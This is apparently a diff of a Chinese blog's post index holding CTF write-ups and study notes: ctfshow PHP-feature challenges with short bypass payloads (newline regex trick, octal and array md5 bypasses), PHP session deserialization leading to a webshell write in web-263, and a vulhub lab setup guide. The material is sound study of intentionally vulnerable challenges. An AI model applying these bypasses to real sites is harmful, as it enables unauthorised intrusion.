-<p>这里我们复制下来，在记事本可以把注释批量去掉</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194905273.png" ></p>
-<p>一看就是base64，但我做到这里的时候没有去解码，而是直接拿去burpsuite爆了，结果啥都没爆出来，然后我就拿去解码了</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222195102450.png" ></p>
-<p>然后我想是不是要写个脚本把这些字符拼接起来，然后我在乱翻的时候，哎哟我，这不key is 谁谁谁吗，然后直接拿去试，还真得了，全靠运气<img   src="/../img/$%7Bfiilename%7D/image-20240222195234074.png" ></p>
-<p>又是点击题，反正上次也是用连点器做出来的，这次也用了，没想到了设置了点击间隔时间的限制，然后我调到0.2s点一次完了给他挂个30来分钟就出来了，就当休息一下哈哈哈</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>  记录一下第一次打的完整的ctf，早上准备开打的时候简直兴奋的发抖，打开题目像癫了一样乱搞，现在回想还真是浪费精力啊，这是一场持久战，还是得慢慢来,最后也是差一题ak，已经超出我的预期了。</p>
-<p>  复盘了一下今天的操作，感觉有几方面需要说出来指正</p>
-<p>  1.资料乱开，又不关，导致全面页面，乱糟糟(最后burpsuite还差点干爆我电脑)</p>
-<p>  2.没有备份的习惯，解题过程中看到的很多信息都是要记录的，今天重新复制粘贴占了蛮多时间</p>
-<p>  3.赛前准备不足，虽然知道今天应该会有http的题，但是忘记去找ip了，今天去找又花了蛮久，痛啊</p>
-<p>道阻且长，同志们还需努力.</p>
-]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>wp</tag>
-        <tag>入门</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaWeb基础学习笔记</title>
     <url>/2024/03/19/JavaWeb%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
@@ -328,64 +406,6 @@
       </categories>
       <tags>
         <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP特性ctfshow</title>
-    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
-<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
-<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
-<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
-<p>所以把4476转为16进制，在开头加入0x传入即可</p>
-<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
-<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
-<p>i:不区分大小写匹配</p>
-<p>m:以每行为一个单位匹配</p>
-<p>^:匹配单位的开头</p>
-<p>$:匹配单位的末尾</p>
-<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
-<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
-<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
-<p><strong>payload:%0aphp</strong></p>
-<p>%0a是url编码的换行符</p>
-<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
-<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
-<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
-<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
-<p>上面说了0开头会以八进制识别</p>
-<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
-<p>要想输出flag，有三个条件</p>
-<p>1.num不能强等于4476</p>
-<p>2.num中不能有字母</p>
-<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
-<p>第一种方法:</p>
-<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
-<p>第二种方法:</p>
-<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
-<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
-<p>弱等于，用以上第一种方法</p>
-<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
-<p>传入.&#x2F;flag.php即可</p>
-<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
-<p>强度于，数组绕过</p>
-<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
-<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
-<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>入门</tag>
-        <tag>学习</tag>
-        <tag>php</tag>
-        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -495,9 +515,67 @@
         <category>学习</category>
       </categories>
       <tags>
-        <tag>入门</tag>
         <tag>学习</tag>
+        <tag>入门</tag>
         <tag>CTFSHOW</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP特性ctfshow</title>
+    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
+<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
+<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
+<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
+<p>所以把4476转为16进制，在开头加入0x传入即可</p>
+<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
+<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
+<p>i:不区分大小写匹配</p>
+<p>m:以每行为一个单位匹配</p>
+<p>^:匹配单位的开头</p>
+<p>$:匹配单位的末尾</p>
+<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
+<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
+<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
+<p><strong>payload:%0aphp</strong></p>
+<p>%0a是url编码的换行符</p>
+<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
+<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
+<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
+<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
+<p>上面说了0开头会以八进制识别</p>
+<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
+<p>要想输出flag，有三个条件</p>
+<p>1.num不能强等于4476</p>
+<p>2.num中不能有字母</p>
+<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
+<p>第一种方法:</p>
+<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
+<p>第二种方法:</p>
+<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
+<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
+<p>弱等于，用以上第一种方法</p>
+<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
+<p>传入.&#x2F;flag.php即可</p>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
+<p>强度于，数组绕过</p>
+<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
+<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>ctf</tag>
+        <tag>入门</tag>
+        <tag>php</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -658,8 +736,8 @@
         <category>学习</category>
       </categories>
       <tags>
-        <tag>入门</tag>
         <tag>学习</tag>
+        <tag>入门</tag>
         <tag>ctfshow</tag>
       </tags>
   </entry>
@@ -726,9 +804,9 @@
         <category>学习</category>
       </categories>
       <tags>
+        <tag>学习</tag>
         <tag>ctf</tag>
         <tag>入门</tag>
-        <tag>学习</tag>
       </tags>
   </entry>
   <entry>
@@ -781,140 +859,6 @@
       <tags>
         <tag>学习</tag>
         <tag>js</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php_Session反序列化学习</title>
-    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
-
-<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
-<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
-<p>简单写个前后端</p>
-<p>注册</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
-<p>填入后可以看到在tem目录下的session文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
-<p>登录</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
-<p>我们就实现了这个功能</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
-<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
-<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
-<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
-<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
-<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
-<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
-<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
-<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
-<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
-<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
-<p>之后再打开登录文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
-<p>修改成功</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
-<p>题面，看源码，抓包无果，直接开扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
-<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
-<p>发现漏洞点</p>
-<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
-<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
-<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
-<p>最后的payload如下 :</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
-<p>然后连接读取flag即可</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>学习</tag>
-        <tag>php反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用kali-linux和docker搭建漏洞复现平台日记</title>
-    <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"><a href="#其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧" class="headerlink" title="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"></a>其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧</h3><span id="more"></span>
-
-<h1 id="kali-linux优化"><a href="#kali-linux优化" class="headerlink" title="kali-linux优化"></a>kali-linux优化</h1><p>刚刚开始下的时候可卡了，输入老是有延迟，用的很不爽</p>
-<h2 id="掉帧问题"><a href="#掉帧问题" class="headerlink" title="掉帧问题"></a>掉帧问题</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/265868395" >解决VMware运行卡顿的问题 - 知乎 (zhihu.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>亲测有效</p>
-<h2 id="num-lock问题"><a href="#num-lock问题" class="headerlink" title="num lock问题"></a>num lock问题</h2><p>鼠标在虚拟机和主机切换的时候老是跳</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311225635342.png"  alt="image-20240311225635342"></p>
-<p>其实是因为主机和虚拟机的lock状态不同，摁数字上面的那个num跳成一致即可</p>
-<h1 id="下载docker和vulhub"><a href="#下载docker和vulhub" class="headerlink" title="下载docker和vulhub"></a>下载docker和vulhub</h1><p>sudo apt-get install docker.io</p>
-<p>sudo apt-get install python3-pip</p>
-<p>sudo apt-get install docker-compose</p>
-<p>git clone <a class="link"   href="https://github.com/vulhub/vulhub.git" >https://github.com/vulhub/vulhub.git<i class="fas fa-external-link-alt"></i></a></p>
-<p>这里出现了好多报错，耐心排查，收集资料</p>
-<h1 id="docker一些小知识"><a href="#docker一些小知识" class="headerlink" title="docker一些小知识"></a>docker一些小知识</h1><p>这里有几个概念，仓库，tar包，dockerfile，容器</p>
-<p>我们要记住这四个东西都是为一个东西——镜像服务的即可</p>
-<p>镜像是什么，镜像就是一个巨大的压缩文件，它可以把很多东西压缩在里面，比如一些系统环境啥的</p>
-<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p>用来存储镜像的地方</p>
-<p><code>docker pull</code>将镜像从仓库拉出来</p>
-<p><code>docker push</code>将镜像推进仓库</p>
-<h2 id="tar包"><a href="#tar包" class="headerlink" title="tar包"></a>tar包</h2><p>tar是镜像的压缩，通过指令可以解压和打包</p>
-<p><code>docker save</code>把镜像打成tar包</p>
-<p><code>docker load</code>把tar包解药为镜像</p>
-<h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>由于dockerfile的语法我不是很懂</p>
-<p>这里只知道dockerfile可以在编辑后通过<code>docker build</code>建成一个镜像文件</p>
-<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>容器就是容纳镜像解压出来后的所有东西，它容下了所有的配置，代码啥的</p>
-<p>我们就可以直接访问这个容器得到所得的服务</p>
-<p><code>docker run -dit -p 100:80 --name ewoji</code>启动容器–参数-d表示在后台运行，-p表示端口映射如100:80（前是内网后是外网）–name 给你的容器取名 -t开个可互动的bash -i标准输出回本机</p>
-<p><code>docker commit</code>容器在改动后还可以再压缩回镜像</p>
-<p><code>docker exec -it yourname bash </code>进入容器的终端进行控制 exit退出 </p>
-<p><code>docker ps</code>查看已经开启的容器的信息</p>
-<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>docker-compose就是掌管多个容器相互通信的东西</p>
-<p>多个容器通过一张docker网卡来实现ip地址的分配，容器之间可以直接curl+ip来获取另一容器的数据，本地则通过网卡路由来与容器交换信息（一般在创建容器的时候要分配好域名，不然又要到容器上看host文件）</p>
-<p><code>docker run -dit --link ewoji:ewoji --name eowji</code>把另一个容器ewoji映射到本容器，其实就是修改host文件</p>
-<p>之后就直接curl ewoji就好了</p>
-<p>既然这样那还用docker-compose干嘛呢，试想如果有三个容器，一个nginx，一个php，一个mysql，用户通过80端口使用NGINX服务，那么Nginx容器必然要用link链接php，而php又要链接mysql，而且创建容器的顺序还必须先从mysql开始，不然php就无法配置链接</p>
-<p>那么有没有一种可能，就是我们把配置文件统一掌管，可以实时修改呢，那就是docker-compose</p>
-<p>等于一个统一部署吧</p>
-<h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240312181044240.png"  alt="image-20240312181044240"></p>
-<p>可见这里做了配置文件和根目录的映射</p>
-<p><code>docker-compose up -d</code>这样就开始拉取镜像了 </p>
-<h1 id="使用vulhub中的靶场"><a href="#使用vulhub中的靶场" class="headerlink" title="使用vulhub中的靶场"></a>使用vulhub中的靶场</h1><p>ls vulhub</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240312174132393.png"  alt="image-20240312174132393"></p>
-<p>这里有很多，选个认识的<code>cd vulhub/weblogic/CVE-2018-2894</code>,<code>docker run -d up</code>这里实际上就是集成了<code>docker run</code>和<code>docker-compose up -d</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240312181853731.png"  alt="image-20240312181853731"></p>
-<p>看到已经启动了，再访问本地ip和你映射的端口即可</p>
-<p><code>docker stop &lt;id or name&gt;</code>关闭容器</p>
-<p><code>docker rm &lt;id or name&gt;</code>删除容器，记得先关闭再删除</p>
-<h1 id="使用本地的镜像文件搭建靶场"><a href="#使用本地的镜像文件搭建靶场" class="headerlink" title="使用本地的镜像文件搭建靶场"></a>使用本地的镜像文件搭建靶场</h1><p>下载好的五题</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195458969.png"  alt="image-20240312195458969"></p>
-<p>进入哪个rd都可以，看见里面有Dockerfile文件，在这里打开终端</p>
-<p><code>docker build -t name .</code>特别注意后面的那个点代表当前目录</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195639419.png"  alt="image-20240312195639419"></p>
-<p>可以看见已经拉成镜像了</p>
-<p>接着这里应该是没有弄docker-compose.yml吧那就两个直接run就好了</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240312205525422.png"  alt="image-20240312205525422"></p>
-]]></content>
-      <categories>
-        <category>复现</category>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
-        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
@@ -988,39 +932,147 @@
         <category>学习</category>
       </categories>
       <tags>
-        <tag>入门</tag>
         <tag>学习</tag>
+        <tag>入门</tag>
         <tag>ctfshow</tag>
         <tag>js</tag>
       </tags>
   </entry>
   <entry>
-    <title>记录一题好玩的游戏题</title>
-    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
+    <title>php_Session反序列化学习</title>
+    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
 
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
-<p>需要我们控制小蛇生存60s，玩玩看</p>
-<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
-<p>玩个蛋，给他60s估计都能飞上月球了</p>
-<p>我们打开控制台看源码</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
-<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
-<p>成功出现flag</p>
-<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
-<p>看看效果</p>
-<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
-<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
-<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
-<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
-
-<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
-<p>嘻嘻</p>
+<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
+<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
+<p>简单写个前后端</p>
+<p>注册</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
+<p>填入后可以看到在tem目录下的session文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
+<p>登录</p>
